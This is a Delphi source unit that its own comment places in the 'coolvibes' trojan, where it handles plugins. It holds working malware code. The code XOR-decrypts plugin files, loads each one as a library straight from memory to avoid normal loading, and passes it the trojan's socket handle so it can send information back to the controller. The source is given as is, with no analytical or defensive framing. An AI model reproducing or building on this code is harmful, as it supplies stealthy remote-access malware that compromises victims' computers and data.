{Unit perteniciente al troyano coolvibes que se encarga de los plugins}
unit UnitPlugins;

interface

uses Windows, SysUtils, Socketunit, UnitVariables, classes, BTMemoryModule;

type
  TPlugin = record
    Nombre  : string;
    id      : integer;
    Recdata : procedure(data:string);stdcall;
    Module : PBTMemoryModule;
  end;
  
var
  Plugins : array[0..100] of TPlugin;
  PluginCount : integer;

procedure cargarplugin(i:integer;socket:Tclientsocket);

implementation

procedure cargarplugin(i:integer;socket:Tclientsocket);
var
  Tmp : string;
  PluginFile : file;
  tamano : integer;
  a : integer;
  rd,p : pointer;
  Start : procedure(id:integer;nombre:string);stdcall;
begin
  FileMode := 0;
  AssignFile(PluginFile, extractfilepath(paramstr(0))+Plugins[i].Nombre);
  Reset(PluginFile, 1);
  tamano := FileSize(PluginFile);
  SetLength(Tmp, tamano);
  BlockRead(PluginFile, tmp[1], tamano);
  CloseFile(PluginFile);

  for a := 1 to Length(Tmp) do //Lo desciframos
    Tmp[a] := chr(Ord(Tmp[a]) xor a);
    
  p := @tmp[1];  
  Plugins[i].Module := BTMemoryLoadLibary(p, length(tmp));
  rd := BTMemoryGetProcAddress(Plugins[i].Module , 'RecData');
  Plugins[i].Recdata := rd;
  @Start := BTMemoryGetProcAddress(Plugins[i].Module , 'Start');
  Start(socket.Socket, Plugins[i].Nombre); //Le damos el handle para que pueda mandar info
end;





end.
